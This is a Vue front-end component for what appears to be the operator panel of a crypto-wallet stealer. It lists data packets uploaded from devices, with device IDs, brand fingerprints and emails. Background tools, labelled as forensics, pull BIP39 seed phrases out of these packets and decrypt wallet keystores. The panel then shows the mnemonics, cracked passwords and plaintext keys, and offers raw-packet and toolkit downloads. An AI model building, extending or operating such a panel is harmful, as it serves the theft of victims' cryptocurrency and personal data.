<script setup lang="ts">
import { onMounted, onUnmounted, ref } from 'vue'
import { panelApi } from '@/api/panel'
import type { WarScanRow } from '@/api/types'
import EmptyState from '@/components/EmptyState.vue'
import { tsShort } from '@/utils/format'
import { ElMessage } from 'element-plus'

/**
 * 工具检测（批量自动）：展示 /war 回传入库后**后台自动**跑 tools/ 取证工具的结果。
 * 不用逐个点——新回传自动检测并写入 war_scan 表；此处批量汇总 + 详情回溯。
 */
const rows = ref<WarScanRow[]>([])
const total = ref(0)
const page = ref(1)
const per = ref(50)
const loading = ref(false)
const onlyHit = ref(false)
const stats = ref<{ scanned?: number; valid?: number; keystores?: number; mnemonics?: number }>({})
const scanning = ref(false)

async function load() {
  loading.value = true
  try {
    const r = await panelApi.warScans(page.value, per.value, onlyHit.value)
    rows.value = r?.rows ?? []
    total.value = Number(r?.total ?? 0)
    if (r?.stats) stats.value = r.stats
  } catch {
    rows.value = []
    total.value = 0
  } finally {
    loading.value = false
  }
}

async function scanPending() {
  scanning.value = true
  try {
    const r = await panelApi.warScanPending()
    ElMessage.info(`已入队 ${r?.enqueued ?? 0} 个待检测 war 包（后台进行）`)
    for (let i = 0; i < 120; i++) {
      await new Promise((res) => setTimeout(res, 3000))
      await load()
      if ((stats.value.scanned ?? 0) >= total.value && !onlyHit.value) break
    }
  } catch {
    ElMessage.error('补扫触发失败')
  } finally {
    scanning.value = false
  }
}

function onPage(p: number) {
  page.value = p
  void load()
}
function onSize(s: number) {
  per.value = s
  page.value = 1
  void load()
}

// ── 详情 ──
type Rep = Record<string, any>
const dialog = ref(false)
const cur = ref<WarScanRow | null>(null)
const report = ref<Rep | null>(null)

async function openDetail(row: WarScanRow) {
  cur.value = row
  report.value = null
  dialog.value = true
  try {
    const d = await panelApi.warScanDetail(row.packet_id!)
    if (d?.detail_json) report.value = JSON.parse(d.detail_json)
  } catch {
    /* ignore */
  }
}
function secrets(rep: Rep | null): Rep[] {
  return Array.isArray(rep?.secrets) ? rep!.secrets : []
}
function mnemonics(rep: Rep | null): Rep[] {
  const seen = new Set<string>()
  const out: Rep[] = []
  for (const s of secrets(rep)) {
    if (!String(s?.type || '').toLowerCase().includes('mnemonic')) continue
    const v = String(s?.value || '')
    if (!v || seen.has(v)) continue
    seen.add(v)
    out.push(s)
  }
  return out
}
function keystores(rep: Rep | null): Rep[] {
  return Array.isArray(rep?.keystores) ? rep!.keystores : []
}
function brandList(row: WarScanRow): string[] {
  return (row.brands || '').split(',').filter(Boolean)
}

let timer: number | undefined
onMounted(() => {
  void load()
  timer = window.setInterval(load, 10000)
})
onUnmounted(() => {
  if (timer) window.clearInterval(timer)
})
</script>

<template>
  <section class="app-card">
    <div class="app-card__head">
      <h3 class="app-card__title">
        <el-icon><MagicStick /></el-icon>工具检测（/war 自动）
        <span class="chip">{{ total }} 个包</span>
        <span class="chip chip--ok">有效助记词 {{ stats.valid ?? 0 }}</span>
        <span class="chip chip--warn">keystore 解密 {{ stats.keystores ?? 0 }}</span>
      </h3>
      <div class="row row--wrap">
        <el-checkbox v-model="onlyHit" size="small" @change="() => { page = 1; load() }">仅命中</el-checkbox>
        <a class="btn-dl" href="/panel/api/forensics/toolkit" download title="下载完整取证工具包（tar.gz）">下载工具包</a>
        <el-button size="small" :loading="loading" @click="load">刷新</el-button>
        <el-button size="small" type="primary" :loading="scanning" @click="scanPending">补扫历史</el-button>
      </div>
    </div>

    <div class="app-card__body app-card__body--flush">
      <el-table :data="rows" size="small" height="calc(100vh - 236px)" empty-text="…" @row-click="openDetail">
        <el-table-column label="命中" width="120">
          <template #default="{ row }">
            <span v-if="row.valid_cnt" class="chip chip--ok">助记词 {{ row.valid_cnt }}</span>
            <span v-else-if="row.keystore_dec" class="chip chip--warn">keystore {{ row.keystore_dec }}</span>
            <span v-else-if="row.mnemonic_cnt" class="chip">候选 {{ row.mnemonic_cnt }}</span>
            <span v-else-if="!row.ok" class="chip chip--err">失败</span>
            <span v-else class="t-3" style="font-size: var(--fs-xs)">无</span>
          </template>
        </el-table-column>
        <el-table-column prop="uuid" label="设备" min-width="230">
          <template #default="{ row }"><span class="mono">{{ row.uuid || '-' }}</span></template>
        </el-table-column>
        <el-table-column label="品牌指纹" min-width="220">
          <template #default="{ row }">
            <div class="chips">
              <span v-for="b in brandList(row)" :key="b" class="chip chip--brand">{{ b }}</span>
              <span v-if="!brandList(row).length" class="t-3" style="font-size: var(--fs-xs)">—</span>
            </div>
          </template>
        </el-table-column>
        <el-table-column label="邮箱" min-width="200">
          <template #default="{ row }"><span class="t-3" style="font-size: var(--fs-xs)">{{ row.emails || '—' }}</span></template>
        </el-table-column>
        <el-table-column label="分析时间" width="150">
          <template #default="{ row }"><span class="mono t-3">{{ tsShort(row.analyzed_ts) }}</span></template>
        </el-table-column>
        <el-table-column label="操作" width="150" fixed="right">
          <template #default="{ row }">
            <el-button link size="small" type="primary" @click.stop="openDetail(row)">详情</el-button>
            <a v-if="row.packet_id" class="btn-dl" :href="`/panel/download?packet_id=${row.packet_id}`" download
              title="下载 war 原包（手动分析）">原包</a>
          </template>
        </el-table-column>
        <template #empty><EmptyState text="暂无检测结果（等新 /war 回传自动检测，或点「补扫历史」）" /></template>
      </el-table>
    </div>

    <div class="pager">
      <el-pagination background layout="total, sizes, prev, pager, next, jumper" :total="total"
        :current-page="page" :page-size="per" :page-sizes="[20, 50, 100]" @current-change="onPage"
        @size-change="onSize" />
    </div>

    <el-dialog v-model="dialog" :title="`检测详情 · ${cur?.uuid || ''}`" width="820px" top="6vh">
      <div v-if="report" class="rep">
        <div v-if="mnemonics(report).length" class="rep__block">
          <div class="rep__label">助记词（BIP39）</div>
          <div v-for="(m, i) in mnemonics(report)" :key="i" class="mn">
            <span class="mono mn__phrase">{{ m.value }}</span>
            <span class="chip" :class="m.bip39 ? 'chip--ok' : 'chip--warn'">{{ m.bip39 ? 'BIP39 ✓' : '未过' }}</span>
            <span v-if="m.crosscheck" class="t-3" style="font-size: var(--fs-xs)">{{ m.crosscheck }}</span>
          </div>
        </div>
        <div v-if="keystores(report).length" class="rep__block">
          <div class="rep__label">keystore</div>
          <div v-for="(k, i) in keystores(report)" :key="i" class="mn">
            <span class="chip" :class="String(k.status) === 'DECRYPTED' ? 'chip--ok' : 'chip--warn'">{{ k.status }}</span>
            <span class="mono" style="font-size: var(--fs-xs)">{{ k.path }}</span>
            <span v-if="k.password" class="t-2 mono" style="font-size: var(--fs-xs)">pw={{ k.password }}</span>
            <span v-if="k.plaintext" class="mono" style="font-size: var(--fs-xs)">{{ k.plaintext }}</span>
          </div>
        </div>
        <el-collapse>
          <el-collapse-item title="原始报告 JSON">
            <pre class="pre mono">{{ JSON.stringify(report, null, 2) }}</pre>
          </el-collapse-item>
        </el-collapse>
      </div>
      <div v-else class="t-3">加载中…</div>
    </el-dialog>
  </section>
</template>

<style scoped>
.chips {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
}
.btn-dl {
  display: inline-flex;
  align-items: center;
  color: var(--brand-2);
  text-decoration: none;
  font-size: var(--fs-xs);
  margin: 0 6px;
}
.btn-dl:hover {
  text-decoration: underline;
}
.pager {
  display: flex;
  justify-content: flex-end;
  padding: var(--sp-3) var(--sp-4);
}
.rep {
  display: flex;
  flex-direction: column;
  gap: var(--sp-3);
}
.rep__block {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.rep__label {
  font-size: var(--fs-xs);
  color: var(--text-3);
}
.mn {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
  padding: 6px 8px;
  border: 1px solid var(--border);
  border-radius: 6px;
  background: var(--bg-hover);
}
.mn__phrase {
  flex: 1;
  word-break: break-all;
}
.pre {
  max-height: 320px;
  overflow: auto;
  font-size: var(--fs-xs);
  white-space: pre-wrap;
  word-break: break-all;
}
</style>
